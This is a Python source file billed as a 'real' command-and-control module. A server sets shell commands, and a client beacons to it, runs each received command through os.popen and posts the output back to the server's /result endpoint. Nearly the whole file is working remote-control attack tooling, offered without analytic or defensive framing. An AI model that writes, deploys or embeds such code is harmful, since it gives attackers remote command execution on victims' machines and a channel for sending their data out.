"""
Real Command and Control Module - Practical implementation of a C2 channel.
"""

import http.server
import socketserver
import threading
import requests
import time
import os

class C2Handler(http.server.SimpleHTTPRequestHandler):
    # This is a class-level variable that will hold the command.
    command = "whoami"

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(f"Received beacon: {post_data.decode('utf-8')}")
        
        # Respond with the current command
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(C2Handler.command.encode('utf-8'))

class C2Server:
    """
    A simple C2 server.
    """
    def __init__(self, host="localhost", port=8888):
        self.host = host
        self.port = port
        self.httpd = None
        self.thread = None

    def start(self):
        """Starts the C2 server in a new thread."""
        handler = C2Handler
        self.httpd = socketserver.TCPServer((self.host, self.port), handler)
        print(f"Starting C2 server on {self.host}:{self.port}")
        self.thread = threading.Thread(target=self.httpd.serve_forever)
        self.thread.daemon = True
        self.thread.start()
        return {"status": "success", "message": f"C2 server started on {self.host}:{self.port}"}

    def set_command(self, command):
        """Sets the command to be executed by the client."""
        C2Handler.command = command
        print(f"New command set: {command}")
        return {"status": "success", "message": f"Command set to '{command}'"}

    def stop(self):
        """Stops the C2 server."""
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
            print("C2 server stopped.")
            return {"status": "success", "message": "C2 server stopped."}
        return {"status": "error", "message": "C2 server not running."}

class C2Client:
    """
    A simple C2 client.
    """
    def __init__(self, server_url="http://localhost:8888"):
        self.server_url = server_url

    def beacon(self, data):
        """Sends a beacon to the C2 server and receives a command."""
        try:
            response = requests.post(self.server_url, data=data)
            if response.status_code == 200:
                command = response.text
                print(f"Received command: {command}")
                # Execute the command and send back the result
                result = self.execute_command(command)
                self.send_result(result)
                return {"status": "success", "command": command, "result": result}
            else:
                return {"status": "error", "message": f"Beacon failed with status code {response.status_code}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def execute_command(self, command):
        """Executes a command on the client machine."""
        try:
            result = os.popen(command).read()
            return result
        except Exception as e:
            return str(e)

    def send_result(self, result):
        """Sends the result of the command back to the C2 server."""
        try:
            # The result is sent in a POST request to a /result endpoint
            requests.post(f"{self.server_url}/result", data=result)
        except Exception as e:
            print(f"Failed to send result: {e}")
